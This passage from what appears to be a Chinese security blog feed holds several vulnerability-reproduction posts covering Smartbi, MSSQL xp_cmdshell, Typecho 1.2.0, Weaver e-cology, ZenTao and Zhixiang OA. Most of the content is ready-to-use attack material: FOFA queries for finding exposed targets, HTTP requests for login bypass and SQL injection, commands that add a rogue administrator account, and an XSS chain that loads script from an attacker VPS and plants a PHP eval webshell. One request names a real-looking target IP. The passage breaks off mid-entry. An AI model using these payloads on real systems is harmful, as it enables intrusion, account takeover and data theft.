    <content><![CDATA[<h1 id="【漏洞复现】Smartbi内置用户登陆绕过漏洞复现"><a href="#【漏洞复现】Smartbi内置用户登陆绕过漏洞复现" class="headerlink" title="【漏洞复现】Smartbi内置用户登陆绕过漏洞复现"></a>【漏洞复现】Smartbi内置用户登陆绕过漏洞复现</h1><p>Smartbi大数据分析产品融合BI定义的所有阶段，对接各种业务数据库、数据仓库和大数据分析平台，进行加工处理、分析挖掘和可视化展现；满足所有用户的各种数据分析应用需求，如大数据分析、可视化分析、探索式分析、复杂报表、应用分享等等。</p>
<h1 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h1><p> Smartbi在安装时会内置几个用户，在使用特定接口时，可绕过用户身份认证机制获取其身份凭证，随后可使用获取的身份凭证调用后台接口，可能导致敏感信息泄露和代码执行。</p>
<h1 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">V7 &lt;= Smartbi &lt;= V10</span><br></pre></td></tr></table></figure>

<h1 id="fofa语法"><a href="#fofa语法" class="headerlink" title="fofa语法"></a>fofa语法</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">app=&quot;SMARTBI&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/2023/08/09/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E3%80%91Smartbi%E5%86%85%E7%BD%AE%E7%94%A8%E6%88%B7%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20230809192648536.png" alt="image-20230809192648536"></p>
<h1 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://your-ip/smartbi/vision/RMIServlet</span><br></pre></td></tr></table></figure>



<p>验证漏洞是否存在如果是如下图则有可能存在</p>
<p><img src="/2023/08/09/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E3%80%91Smartbi%E5%86%85%E7%BD%AE%E7%94%A8%E6%88%B7%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20230809192709105.png" alt="image-20230809192709105"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /smartbi/vision/RMIServlet HTTP/1.1</span><br><span class="line">Host: your-ip</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">className=UserService&amp;methodName=loginFromDB&amp;params=[&quot;system&quot;,&quot;0a&quot;]</span><br></pre></td></tr></table></figure>

<p><img src="/2023/08/09/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E3%80%91Smartbi%E5%86%85%E7%BD%AE%E7%94%A8%E6%88%B7%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20230809192758898.png" alt="image-20230809192758898"></p>
<p>复现成功如上图所示</p>
<p>请求体中传入的三个参数</p>
<p>className：必须指定UserService类名methodName：该类调用的方法loginFromDB</p>
<p>params：其中的第一个参数是内置的三个用户名（public、service、system）可随机构造，第二个参数是三个账号默认的密文密码(默认值为0a)</p>
<p>使用Hackbar插件发送post请求绕过登录</p>
<p><img src="/2023/08/09/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E3%80%91Smartbi%E5%86%85%E7%BD%AE%E7%94%A8%E6%88%B7%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20230809192820739.png" alt="image-20230809192820739"></p>
<p>发送请求后，重新刷新页面即可登录后台</p>
<p><img src="/2023/08/09/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E3%80%91Smartbi%E5%86%85%E7%BD%AE%E7%94%A8%E6%88%B7%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20230809193028682.png" alt="image-20230809193028682"></p>
<h1 id="缓解方案"><a href="#缓解方案" class="headerlink" title="缓解方案"></a>缓解方案</h1><p>在确认不影响业务的前提下，删除内置的几个账号（public、service、system）。同时如非必要，不要将Smartbi系统开放在互联网上。</p>
]]></content>
      <categories>
        <category>-fuxian</category>
      </categories>
  </entry>
  <entry>
    <title>【漏洞复现】MSSQL xp_cmdshell提权漏洞</title>
    <url>/2023/03/15/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E3%80%91MSSQL-xp-cmdshell%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h1 id="【漏洞复现】MSSQL-xp-cmdshell提权漏洞"><a href="#【漏洞复现】MSSQL-xp-cmdshell提权漏洞" class="headerlink" title="【漏洞复现】MSSQL xp_cmdshell提权漏洞"></a>【漏洞复现】MSSQL xp_cmdshell提权漏洞</h1><p>xp_cmdshell默认在mssql2000中是开启的，在mssql2005之后默认禁止，但未删除。</p>
<p>利用前提</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Mssql数据库服务未降权（sa权限）</span><br><span class="line">已获取到数据库密码</span><br></pre></td></tr></table></figure>

<h1 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h1><p>获取sa账号密码后，连接上数据库，从dbo.sysobjects中查询，判断xp_cmdshell状态。有返回则为已开启。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//有返回即已开启，xtype为对象类型，xtype=&#x27;x&#x27;这里表示xp_cmdshell的对象类型为扩展存储过程。</span><br><span class="line">select * from master.dbo.sysobjects where xtype=&#x27;x&#x27; and name=&#x27;xp_cmdshell&#x27;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//只用判断存在，利用count(*)即可，返回1即存在。</span><br><span class="line">select count(*) from master.dbo.sysobjects where xtype=&#x27;x&#x27; and name=&#x27;xp_cmdshell&#x27;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//利用EXEC启用xp_cmdshell</span><br><span class="line">EXEC sp_configure &#x27;show advanced options&#x27;, 1;RECONFIGURE;EXEC sp_configure &#x27;xp_cmdshell&#x27;, 1;RECONFIGU</span><br></pre></td></tr></table></figure>

<p>利用xp_cmdshell执行命令，通过xp_cmdshell执行系统命令指令如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">exec master..xp_cmdshell &#x27;whoami&#x27;</span><br></pre></td></tr></table></figure>

<p><img src="/2023/03/15/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E3%80%91MSSQL-xp-cmdshell%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/image-20230315194527733.png" alt="image-20230315194527733"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//添加账号test 密码123.com的用户</span><br><span class="line">exec master..xp_cmdshell &quot;net user test12 123.com /add&quot;</span><br><span class="line">exec master..xp_cmdshell &quot;net localgroup administrators test12 /add&quot;</span><br><span class="line">exec master..xp_cmdshell &quot;net user test12&quot;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>-fuxian</category>
      </categories>
  </entry>
  <entry>
    <title>【漏洞复现】Typecho v1.2.0 rce复现</title>
    <url>/2023/04/16/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E3%80%91Typecho-v1-2-0-rce%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h1 id="【漏洞复现】Typecho-v1-2-0-rce复现"><a href="#【漏洞复现】Typecho-v1-2-0-rce复现" class="headerlink" title="【漏洞复现】Typecho v1.2.0 rce复现"></a>【漏洞复现】Typecho v1.2.0 rce复现</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/typecho/typecho/releases/tag/v1.2.0</span><br></pre></td></tr></table></figure>

<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>最新版本是v1.2.1，存在漏洞的版本为v1.2.0</p>
<p>通过上面的链接将环境下载下来，然后放在目录下面开phpstudy就可以了。</p>
<p>然后直接install.php安装就可以了。</p>
<p><img src="/2023/04/16/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E3%80%91Typecho-v1-2-0-rce%E5%A4%8D%E7%8E%B0/image-20230416133151360.png" alt="image-20230416133151360"></p>
<p>然后就是正常安装就可以了。</p>
<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>在评论处的网站框插入POC</p>
<p><img src="/2023/04/16/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E3%80%91Typecho-v1-2-0-rce%E5%A4%8D%E7%8E%B0/image-20230416133733737.png" alt="image-20230416133733737"></p>
<p>成功触发xss</p>
<p><img src="/2023/04/16/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E3%80%91Typecho-v1-2-0-rce%E5%A4%8D%E7%8E%B0/image-20230416133759135.png" alt="image-20230416133759135"></p>
<p>在后台的那个/admin/index.php登录进去，查看评论。</p>
<p><img src="/2023/04/16/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E3%80%91Typecho-v1-2-0-rce%E5%A4%8D%E7%8E%B0/image-20230416134049273.png" alt="image-20230416134049273"></p>
<p>成功触发xss</p>
<p><img src="/2023/04/16/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E3%80%91Typecho-v1-2-0-rce%E5%A4%8D%E7%8E%B0/image-20230416134103297.png" alt="image-20230416134103297"></p>
<h2 id="rce"><a href="#rce" class="headerlink" title="rce"></a>rce</h2><p>rce需要远程加载以下js文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function step1()&#123; var data2=&quot;&lt;iframe id=\&quot;testxss\&quot; src=\&quot;/admin/theme-editor.php?theme=default&amp;file=404.php\&quot; width=\&quot;0%\&quot; height=\&quot;0%\&quot; onload=\&quot;poc()\&quot;&gt;&lt;/iframe&gt;&quot;; var oldata=document.body.innerHTML; document.body.innerHTML=(oldata+data2); &#125;</span><br><span class="line"></span><br><span class="line">var times=0; var g_shell=0; function poc()&#123; if(times&lt;=10)&#123; var htmldata=document.getElementById(&#x27;testxss&#x27;).contentWindow.document.getElementById(&#x27;content&#x27;); var btn=document.getElementById(&#x27;testxss&#x27;).contentWindow.document.getElementsByTagName(&#x27;button&#x27;); olddatas=htmldata.innerText; htmldata.innerText=(&#x27;&lt;?php @eval($_GET[&quot;cookie&quot;])?&gt;\n&#x27;)+olddatas; btn[1].click(); times+=1; if(g_shell==1)&#123; var xhr1=new XMLHttpRequest(); xhr1.open(&#x27;get&#x27;,&#x27;/usr/themes/default/404.php?shell=1&#x27;); xhr1.send(); &#125; else&#123; return 0; &#125; &#125; &#125; step1();</span><br></pre></td></tr></table></figure>

<p>将这个js部署到其他的web服务器上面去。</p>
<p><img src="/2023/04/16/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E3%80%91Typecho-v1-2-0-rce%E5%A4%8D%E7%8E%B0/image-20230416134613324.png" alt="image-20230416134613324"></p>
<p>在评论处的网站框插入POC</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://xxx.xxx.com/&quot;&gt;&lt;/a&gt;&lt;script/src=http://vpsip/rce.js&gt;&lt;/script&gt;&lt;a/href=&quot;#</span><br></pre></td></tr></table></figure>

<p><img src="/2023/04/16/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E3%80%91Typecho-v1-2-0-rce%E5%A4%8D%E7%8E%B0/image-20230416134718786.png" alt="image-20230416134718786"></p>
<p>提交完毕之后发现服务器那边已经被访问了</p>
<p><img src="/2023/04/16/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E3%80%91Typecho-v1-2-0-rce%E5%A4%8D%E7%8E%B0/image-20230416135209940.png" alt="image-20230416135209940"></p>
<p>但是现在是游客，没有权限去修改，需要利用管理员的身份来对404.php文件进行编辑</p>
<p>登录后台进行管理评论，页面有短暂的转圈</p>
<p><img src="/2023/04/16/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E3%80%91Typecho-v1-2-0-rce%E5%A4%8D%E7%8E%B0/image-20230416135519689.png" alt="image-20230416135519689"></p>
<p>服务器的js文件又被请求了</p>
<p><img src="/2023/04/16/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E3%80%91Typecho-v1-2-0-rce%E5%A4%8D%E7%8E%B0/image-20230416135538141.png" alt="image-20230416135538141"></p>
<p><img src="/2023/04/16/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E3%80%91Typecho-v1-2-0-rce%E5%A4%8D%E7%8E%B0/image-20230416141532736.png" alt="image-20230416141532736"></p>
<p>成功更改</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\usr\themes\default\404.php</span><br></pre></td></tr></table></figure>

<p><img src="/2023/04/16/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E3%80%91Typecho-v1-2-0-rce%E5%A4%8D%E7%8E%B0/image-20230416141605362.png" alt="image-20230416141605362"></p>
<p>成功。</p>
]]></content>
      <categories>
        <category>-fuxian</category>
      </categories>
  </entry>
  <entry>
    <title>【漏洞复现】泛微 e-cology-FileDownloadForOutDoc前台SQL注入漏洞复现</title>
    <url>/2023/08/09/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E3%80%91%E6%B3%9B%E5%BE%AE-e-cology-FileDownloadForOutDoc%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h1 id="【漏洞复现】泛微-e-cology-FileDownloadForOutDoc前台SQL注入漏洞复现"><a href="#【漏洞复现】泛微-e-cology-FileDownloadForOutDoc前台SQL注入漏洞复现" class="headerlink" title="【漏洞复现】泛微 e-cology-FileDownloadForOutDoc前台SQL注入漏洞复现"></a>【漏洞复现】泛微 e-cology-FileDownloadForOutDoc前台SQL注入漏洞复现</h1><p>最近hw也是曝出好多好多漏洞啊，看的考研人直发痒啊啊啊。0day咱拿不到还不能玩点高频漏洞吗。所以这里收集了30几个23年的常用漏洞，来挨个复现一下哈。没事就复现一下。目前笔者也是在学c语言准备考研了，考完之后的话可能大概会继续专研技术，主要分两个方向吧，恶意软件编写和分析和web安全方面的，当然一切都还没有定数。（万一去玩web3的也说不定呢）祝笔者今年顺利考上研究生。</p>
<h1 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Ecology 9.x 补丁版本 &lt; 10.58.0</span><br><span class="line"></span><br><span class="line">Ecology 8.x 补丁版本 &lt; 10.58.0</span><br></pre></td></tr></table></figure>

<h1 id="语法特征"><a href="#语法特征" class="headerlink" title="语法特征"></a>语法特征</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">app.name=&quot;泛微 e-cology 9.0 OA&quot;</span><br><span class="line"></span><br><span class="line">app.name=&quot;泛微 e-cology OA&quot;</span><br><span class="line"></span><br><span class="line">app=&quot;泛微-协同商务系统&quot;</span><br></pre></td></tr></table></figure>

<h1 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /weaver/weaver.file.FileDownloadForOutDoc HTTP/1.1</span><br><span class="line">Host: 101.230.160.27:8885</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">If-None-Match: &quot;AyurgkJJwkD&quot;</span><br><span class="line">If-Modified-Since: Sat, 15 Oct 2022 01:55:58 GMT</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 47</span><br><span class="line"></span><br><span class="line">fileid=512+WAITFOR+DELAY+&#x27;0:0:8&#x27;&amp;isFromOutImg=1</span><br></pre></td></tr></table></figure>

<p>由于泛微OA启用了RASP，同一个请求执行两次会被拦截，所以需要在请求包中添加随机参数；下面是RASP的介绍</p>
<p>RASP是Runtime Application Self-Protection（运行时应用自我保护）的缩写，是一种用于保护应用程序免受攻击的安全技术。它是在应用程序运行时进行安全检测和保护的一种方法，可以在应用程序本身内部或与应用程序紧密集成的组件中实现。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /weaver/weaver.file.FileDownloadForOutDoc HTTP/1.1</span><br><span class="line">Host: ip:port</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Safari/537.36</span><br><span class="line">Content-Length: 45</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">fileid=&#123;random&#125;+WAITFOR+DELAY+&#x27;0:0:5&#x27;&amp;isFromOutImg=1</span><br></pre></td></tr></table></figure>









<p>nuclei poc如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id: ecology-oa-filedownloadforoutdoc-sqli</span><br><span class="line"></span><br><span class="line">info:</span><br><span class="line">  name: EcologyOA filedownloadforoutdoc - SQL injection</span><br><span class="line">  author: unknown</span><br><span class="line">  severity: critical</span><br><span class="line">  description: EcologyOA filedownloadforoutdoc interface has SQL injection</span><br><span class="line">  tags: ecology-oa,sqli</span><br><span class="line"></span><br><span class="line">requests:</span><br><span class="line">  - raw:</span><br><span class="line">      - |</span><br><span class="line">        POST /weaver/weaver.file.FileDownloadForOutDoc HTTP/1.1</span><br><span class="line">        Host: &#123;&#123;Hostname&#125;&#125;</span><br><span class="line">        Accept: */*</span><br><span class="line">        Accept-Encoding: gzip, deflate</span><br><span class="line">        Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">        Connection: close        </span><br><span class="line"></span><br><span class="line">        fileid=2+WAITFOR DELAY+&#x27;0:0:5&#x27;&amp;isFromOutImg=1</span><br><span class="line">    matchers:</span><br><span class="line">      - type: dsl</span><br><span class="line">        dsl:</span><br><span class="line">          - &#x27;duration&gt;=5&#x27;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="tamper脚本"><a href="#tamper脚本" class="headerlink" title="tamper脚本"></a>tamper脚本</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import random</span><br><span class="line">from lib.core.enums import PRIORITY</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.HIGH</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def tamper(payload, **kwargs):</span><br><span class="line">  res = &quot;&quot;</span><br><span class="line">  ran = random.randint(1,2**20)</span><br><span class="line">  res = str(ran)+payload</span><br><span class="line">  return res</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>-fuxian</category>
      </categories>
  </entry>
  <entry>
    <title>【漏洞复现】禅道项目管理系统存在远程命令执行漏洞（RCE）</title>
    <url>/2023/04/15/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E3%80%91%E7%A6%85%E9%81%93%E9%A1%B9%E7%9B%AE%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E5%AD%98%E5%9C%A8%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88RCE%EF%BC%89/</url>
    <content><![CDATA[<h1 id="【漏洞复现】禅道项目管理系统存在远程命令执行漏洞（RCE）"><a href="#【漏洞复现】禅道项目管理系统存在远程命令执行漏洞（RCE）" class="headerlink" title="【漏洞复现】禅道项目管理系统存在远程命令执行漏洞（RCE）"></a>【漏洞复现】禅道项目管理系统存在远程命令执行漏洞（RCE）</h1><h1 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">企业版 7.4以下的未知版本&lt;=version&lt;=8.0.beta1 8.0.beta2 </span><br><span class="line"></span><br><span class="line">开源版 17.4以下的未知版本&lt;=version&lt;=18.0.beta1 </span><br><span class="line"></span><br><span class="line">旗舰版 3.4以下的未知版本&lt;=version&lt;=4.0.beta1</span><br></pre></td></tr></table></figure>

<h1 id="fofa"><a href="#fofa" class="headerlink" title="fofa"></a>fofa</h1><p><code>fofa：title=&quot;用户登录 - 禅道&quot; </code></p>
<p><img src="/2023/04/15/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E3%80%91%E7%A6%85%E9%81%93%E9%A1%B9%E7%9B%AE%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E5%AD%98%E5%9C%A8%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88RCE%EF%BC%89/image-20230415154930327.png" alt="image-20230415154930327"></p>
<h1 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h1><p>先依次发送如下两个请求：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /misc-captcha-user.html HTTP/1.1</span><br><span class="line">Host: xxx</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: zentaosid=mdcv95902sc4i9kq3k3hda4dr7; lang=zh-cn; device=desktop; theme=default; windowWidth=1536; windowHeight=703</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/2023/04/15/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E3%80%91%E7%A6%85%E9%81%93%E9%A1%B9%E7%9B%AE%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E5%AD%98%E5%9C%A8%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88RCE%EF%BC%89/image-20230415155015483.png" alt="image-20230415155015483"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /repo-create.html HTTP/1.1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36</span><br><span class="line">Cookie: zentaosid=u6vl6rc62jiqof4g5jtle6pft2; lang=zh-cn; device=desktop; theme=default</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">Referer: http://xxx:xx/repo-edit-1-0.html</span><br><span class="line">Host: xxx.xxx.xx.xx</span><br><span class="line">Content-Length: 111</span><br><span class="line">Expect: 100-continue</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">product%5B%5D=1&amp;SCM=Gitlab&amp;name=66666&amp;path=&amp;encoding=utf-8&amp;client=&amp;account=&amp;password=&amp;encrypt=base64&amp;desc=&amp;uid=</span><br></pre></td></tr></table></figure>

<p><img src="/2023/04/15/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E3%80%91%E7%A6%85%E9%81%93%E9%A1%B9%E7%9B%AE%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E5%AD%98%E5%9C%A8%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88RCE%EF%BC%89/image-20230415155106384.png" alt="image-20230415155106384"></p>
<p>发送如下请求，如果存在漏洞，则返回包中会包含命令执行的结果，如执行‘id’命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /repo-edit-10000-10000.html HTTP/1.1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36</span><br><span class="line">Cookie: zentaosid=u6vl6rc62jiqof4g5jtle6pft2; lang=zh-cn; device=desktop; theme=default</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">Referer: http://xxxx/repo-edit-1-0.html</span><br><span class="line">Host: xxxx</span><br><span class="line">Content-Length: 26</span><br><span class="line">Expect: 100-continue</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">SCM=Subversion&amp;client=`id`</span><br></pre></td></tr></table></figure>

<p><img src="/2023/04/15/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E3%80%91%E7%A6%85%E9%81%93%E9%A1%B9%E7%9B%AE%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E5%AD%98%E5%9C%A8%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88RCE%EF%BC%89/image-20230415155155819.png" alt="image-20230415155155819"></p>
<p><img src="/2023/04/15/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E3%80%91%E7%A6%85%E9%81%93%E9%A1%B9%E7%9B%AE%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E5%AD%98%E5%9C%A8%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88RCE%EF%BC%89/image-20230415155217681.png" alt="image-20230415155217681"></p>
]]></content>
      <categories>
        <category>-fuxian</category>
      </categories>
  </entry>
  <entry>
    <title>【漏洞复现】致翔OA msglog.aspx SQL注入漏洞</title>
    <url>/2023/03/08/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E3%80%91%E8%87%B4%E7%BF%94OA-msglog-aspx-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h1 id="【漏洞复现】致翔OA-msglog-aspx-SQL注入漏洞"><a href="#【漏洞复现】致翔OA-msglog-aspx-SQL注入漏洞" class="headerlink" title="【漏洞复现】致翔OA msglog.aspx SQL注入漏洞"></a>【漏洞复现】致翔OA msglog.aspx SQL注入漏洞</h1><p>致翔OA是集成多个行业应用功能的OA协同办公平台,其核心机制是创新与合作,秉承开放的精神,可以提供嵌入式的OA系统开发支持。致翔OA msglog.aspx文件存在SQL注入漏洞，攻击者通过漏洞可获取敏感信息。</p>
<h1 id="fofa语法"><a href="#fofa语法" class="headerlink" title="fofa语法"></a>fofa语法</h1><p><code>fofa:app=&quot;致翔软件-致翔OA&quot;</code></p>
<h1 id="注入点"><a href="#注入点" class="headerlink" title="注入点"></a>注入点</h1><p><code>python sqlmap.py -u http://&#123;&#123;Hostname&#125;&#125;/mainpage/msglog.aspx?user=1 --dbs</code></p>
<p><img src="/2023/03/08/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E3%80%91%E8%87%B4%E7%BF%94OA-msglog-aspx-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/image-20230308194937667.png" alt="image-20230308194937667"></p>
]]></content>
      <categories>
        <category>-fuxian</category>
      </categories>
  </entry>
  <entry>
    <title>【漏洞复现】蜂网互联 企业级路由器v4.31 密码泄露漏洞</title>
    <url>/2023/03/17/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E3%80%91%E8%9C%82%E7%BD%91%E4%BA%92%E8%81%94-%E4%BC%81%E4%B8%9A%E7%BA%A7%E8%B7%AF%E7%94%B1%E5%99%A8v4-31-%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/</url>
